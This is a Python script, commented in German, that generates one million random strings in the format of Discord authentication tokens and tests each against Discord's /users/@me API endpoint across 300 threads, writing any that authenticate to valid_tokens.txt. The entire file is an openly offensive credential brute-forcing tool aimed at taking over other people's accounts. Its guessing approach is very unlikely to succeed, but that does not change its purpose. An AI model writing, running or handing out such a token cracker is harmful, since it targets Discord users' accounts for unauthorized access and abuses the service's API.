import string
import random
import requests
import json
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# Konfigurationsparameter
NUM_TOKENS = 1000000
NUM_THREADS = 300
OUTPUT_FILE = 'valid_tokens.txt'
DISCORD_API_URL = 'https://discord.com/api/v8/users/@me'

# Token-Generierung
def generate_token():
    first = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=24))
    second = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=6))
    third = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=38))
    return f"{first}.{second}.{third}"

# Token-Überprüfung
def check_token(token):
    headers = {'Authorization': token}
    try:
        response = requests.get(DISCORD_API_URL, headers=headers)
        if response.status_code == 200:
            return token
    except requests.RequestException:
        pass
    return None

# Hauptprozess für Token-Generierung und -Validierung
def process_tokens():
    start_time = time.time()
    valid_tokens = []

    # Token Generierung
    print(f"Generating {NUM_TOKENS} tokens...")
    tokens = [generate_token() for _ in range(NUM_TOKENS)]

    # Token Überprüfung mit Threads
    print(f"Checking tokens with {NUM_THREADS} threads...")
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        future_to_token = {executor.submit(check_token, token): token for token in tokens}
        for future in as_completed(future_to_token):
            token = future_to_token[future]
            result = future.result()
            if result:
                valid_tokens.append(result)

    # Speichern der gültigen Tokens
    print(f"Saving valid tokens to {OUTPUT_FILE}...")
    with open(OUTPUT_FILE, 'w') as file:
        for token in valid_tokens:
            file.write(f"{token}\n")

    print(f"Valid Tokens: {len(valid_tokens)}")
    print(f"Processing Time: {time.time() - start_time:.2f} seconds")

if __name__ == "__main__":
    process_tokens()
